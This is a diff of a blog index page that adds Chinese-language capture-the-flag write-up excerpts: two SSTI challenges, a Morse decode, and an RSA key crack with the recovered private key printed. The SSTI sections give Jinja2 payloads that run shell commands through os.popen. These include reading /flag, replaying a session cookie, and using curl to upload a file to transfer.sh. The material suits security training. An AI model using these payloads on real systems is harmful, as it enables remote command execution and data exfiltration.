@@ -395,7 +395,7 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>531</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -414,7 +414,26 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+          <h1 id="Open-Flag"><a href="#Open-Flag" class="headerlink" title="Open Flag"></a>Open Flag</h1><hr>
+<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src="images/login.png" alt="Open Flag" style="zoom:80%;"><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src="images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;"></p>
+<p>使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记<code>&lt;!--</code>,找到<code>os._wrap_close</code>模块所在的索引为132,借助于<code>popen</code>函数可以直接执行系统命令</p>
+<pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()}}
+</code></pre>
+<p><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119212248483.png" alt="image-20211119212248483"></p>
+<p>使用<code>curl</code>命令将<code>flag.jpg</code>文件上传至<a href="http://transfer.sh/" target="_blank" rel="noopener">transfer.sh</a></p>
+<pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()}}
+</code></pre>
+<p>在HTML注释中找到文件上传后的URL<code>http://transfer.sh/bDGBlw/flag.jpg</code><br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png" alt="image-20211119204635015"></p>
+<p><img data-src="images/flag.jpg" alt="Open Flag" style="zoom:80%;"></p>
+<p><strong>flag:</strong><code>TamilCTF{SsTi_Is_VeRy_DaNgErOuS}</code><br>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/2827311957/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -485,14 +504,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>3.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>6 分钟</span>
             </span>
 
         </div>
@@ -504,7 +523,20 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+          <h1 id="SEA-LANGUAGE-1"><a href="#SEA-LANGUAGE-1" class="headerlink" title="SEA LANGUAGE 1"></a>SEA LANGUAGE 1</h1><p><em>Quick! Help! We are sinking!</em></p>
+<p><em>Wrap the result in TFCCTF{}</em></p>
+<hr>
+<p>看着像摩斯码,直接在<a href="https://gchq.github.io/CyberChef/#recipe=From_Morse_Code(&#39;Space&#39;,&#39;Line%20feed&#39;" target="_blank" rel="noopener">gchq.github.io</a>&amp;input=Li0tIC4uLi4gLi4uLi0gLSAtLi4uLi0gLi0gLi0uIC4uLi0tIC0uLi4uLSAtLi0tIC0tLS0tIC4uLSAtLi4uLi0gLi4uIC4tLS0tIC0uIC0uLSAuLS0tLSAtLiAtLS4gLS4uLi4tIC4tIC0uLi4gLS0tLS0gLi4tIC0gLi4tLS4uIC0uLS4tLSAtLi0uLS0gLS4tLi0tIC4uLS0uLgo)上解密</p>
+<p><img data-src="../../CTF/TFCCTF2021/Crypto/images/image-20211202204916391.png" alt="image-20211202204916391"></p>
+<p><strong>flag:</strong><code>TFCCTF{WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?}</code><br>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/501486646/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -575,14 +607,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>1.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -594,7 +626,55 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+          <h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p><em><a href="http://123.60.19.253:10001" target="_blank" rel="noopener">http://123.60.19.253:10001</a></em></p>
+<hr>
+<p>分析给出的源文件,发现<code>/success</code>路由下的<code>name</code>存在SSTI漏洞.</p>
+<p>继续分析,<code>name</code>取自<code>session[&#39;name&#39;]</code>,用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.</p>
+<pre><code class="python">template =  <span class="string">'''</span>
+<span class="string">Congratulations, %s. You can get flag now!</span>
+<span class="string">'''</span> % name
+<span class="keyword">return</span> render_template_string(template)
+</code></pre>
+<p>要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,<code>/vote</code>接口会校验<code>session</code>中保存的vote数量并减一,猜测这里可能存在session会话劫持.</p>
+<p>我们第一次登录时复制一下当前的<code>session</code>,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的<code>seesion</code>粘贴进浏览器保存的Cookie中,我们的票又回来了.</p>
+<blockquote>
+<p>🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.</p>
+</blockquote>
+<p><img data-src="images/0.jpg" alt="image-20211114190032492" style="zoom:50%;"></p>
+<p>使用如下代码作为用户名登录,查看一下当前已加载模块</p>
+<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()}}
+</code></pre>
+<p><img data-src="images/1.jpg" alt="image-20211114182131940" style="zoom:50%;"></p>
+<p>人肉计数/写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>
+<pre><code class="python">num = <span class="number">0</span>
+<span class="keyword">for</span> i <span class="keyword">in</span> a.split(<span class="string">', '</span>):
+    <span class="keyword">if</span> <span class="string">'os._wrap_close'</span> <span class="keyword">in</span> i:
+        print(num)
+    num += <span class="number">1</span>
+</code></pre>
+<p>先<code>ls -a</code>一下,发现<code>config.py</code></p>
+<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()}}
+</code></pre>
+<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/2.png" alt="image-20211114183143814"><br>继续<code>cat</code>,没有在<code>config.py</code>中找到flag</p>
+<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()}}
+</code></pre>
+<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/3.png" alt="image-20211114183703433"></p>
+<p>用<code>ls -R /</code>找找,发现存在<code>/flag</code>文件</p>
+<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()}}
+</code></pre>
+<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/4.jpg" alt="image-20211114183857713"><br>直接<code>cat /flag</code>即可</p>
+<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
+</code></pre>
+<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/5.png" alt="image-20211114184236370"></p>
+<p><strong>flag:</strong><code>l3hsec{emmMmMM_mm~mMMmm~~T}</code></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/98571386/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -665,14 +745,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>8.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>14 分钟</span>
             </span>
 
         </div>
@@ -684,7 +764,59 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+          <h1 id="Cloudsourcing"><a href="#Cloudsourcing" class="headerlink" title="Cloudsourcing"></a>Cloudsourcing</h1><p><em>Sourced in the cloud</em></p>
+<hr>
+<p>使用<a href="https://github.com/Ganapati/RsaCtfTool" target="_blank" rel="noopener">RsaCtfTool</a>破解公钥,将得到的私钥保存至<code>a.pem</code></p>
+<pre><code class="shell">~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpcE1waspEO5B48ZgjIfZyloCzR5cC2Rc1
+e+YwvI/2hNPuageLgmjOqk6FLO3dxa2kemzH2EBG+n7RHlxIe4z6hobXCkXM4Sd4
+O7NvHlkebe5ULoOvpJxs5f7LB4zNffl49MLVRmGJOWI33LVPi86VQg53U5nVCUTn
+dmqWJsnjf06aeNJb0htFA1oy7eA9GaaNyBZC7recU+pj5CJmnlitxaSaLLTahi7m
+lW92j4LDnDnIODhEtxqmWA3sMLoMGGwlve1+cXd4+r1ovhkBWmkBR5/lp/p2KQLs
+pet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8WQIDAQABAoIBADrihoWyoi2L4K3Z
+KFwODGTIFx4UTW/dXK9hHO4sjcTMAwgxzan4miFxGaZxfWa1NYW89xgNIc+LjWgs
+dBag4hMeFn/IJc8VYcL55+T0Cf4rmyc8ARb4XLkTj1Sx3zvdk2ejbufr3WwULd6o
+19k7kqD4Wby6fxb4e5O9OjzTE9BLvr1NpHN1QRUupSUX3kv/mhtO3gQrRrkAT1L2
+Ais+piqHmSrtX6YAnjood9oW2qy6oyBWvA11ipY9ZqfpI2G5Qc9WtViH/Erz2/3S
+wFf0J9pgn+iAPbhcGwVh6U/cF+BcQZGse9GaY5Us4SJaQmM0ZdKiYbhKTRGBkudH
+60sqeDUCgYEA0mwnrjcDpoc5Kv7qMB4AQCwP6LKnaG5q8Tc86JzYaPEnfUzl4trO
+TruiSXmsok8RM/OLdAiIYiazz3GWgxFVNGtv+cEk4AKQnu2iRg5kP4wKBzqhYCnT
+gMMMnt2UQfUrPOX7WDHaqQaOxkF06GJeHY7/RMswdOlXWx3w4oo2LJMCgYEA+atH
+z0eS+0wzV4lubfpNl/6gi6KJxnpoPJtDt2vJBAa24fbS6ox9bx+Riki/CkpWiGDs
+mb2ha1j5580kzDLfJjt1rncCd1iJy+S8zXmX0I1lkmhCnGKjsDDP4nqGmWoHyc9U
+HxBYPWd2RtKNcBVDLImxr9IGe74GArU0Q2TmcuMCgYAvtwDEe4sjXvRysH1QTe1G
+n/c3kBNwFeHAMwNnx/E20sBepGpYp78ykU+6k5G2+HDxM9/CfxDWGOqbNqmnrO2C
+Rn6MxuRiu5Ipx78NXcQTuOCpRP1E/hcM0q3w9FPjJQIZ/BijpiJsQ6VqhXtKGsw2
+ra9q3Rxu1l7NtZti825XawKBgHMG2LTE8xDYUKc56Ci/M1SduXXb0sIgzzltB0vQ
+WvKB7Ww5/X6Wb4vs7W7aiTnCeg+nKBrE5UPB4JFNUHDL10eUCWnx5q75mbLYlavN
+I4awPmWvp1DJmUSpmH1tmenAkgoGfWk6bI0Nx85lX0iOYz53yeeJSfdk2vwQZB3Q
+tOOlAoGBAM83orP3tq+o57yvX/v36APtNW7ja7fMnSnmZRuWyJDqCJMNvGRlGObt
+hfLludqNeJ4BSJ1nZNqbIvukk8J7DDukrGE5WxP+L1UmuIcTLgOeW7heMEUFbuVG
+SpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p>编写代码,用RSA解密</p>
+<pre><code class="python"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA
+<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> PKCS1_cipher
+<span class="keyword">import</span> base64
+c = <span class="string">'Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA=='</span>
+
+<span class="keyword">with</span> open(<span class="string">'a.pem'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:
+    pri_key = RSA.importKey(f.read())
+    cipher = PKCS1_cipher.new(pri_key)
+    plain = cipher.decrypt(base64.b64decode(c), <span class="number">0</span>)
+    print(plain)
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}</code><br>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/2621990551/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -842,13 +974,13 @@
       <i class="fa fa-area-chart"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">125k</span>
+    <span title="站点总字数">177k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">3:28</span>
+    <span title="站点阅读时长">4:56</span>
 </div>
   <div class="addthis_inline_share_toolbox">
     <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5a73dc9a89a291e2" async="async"></script>
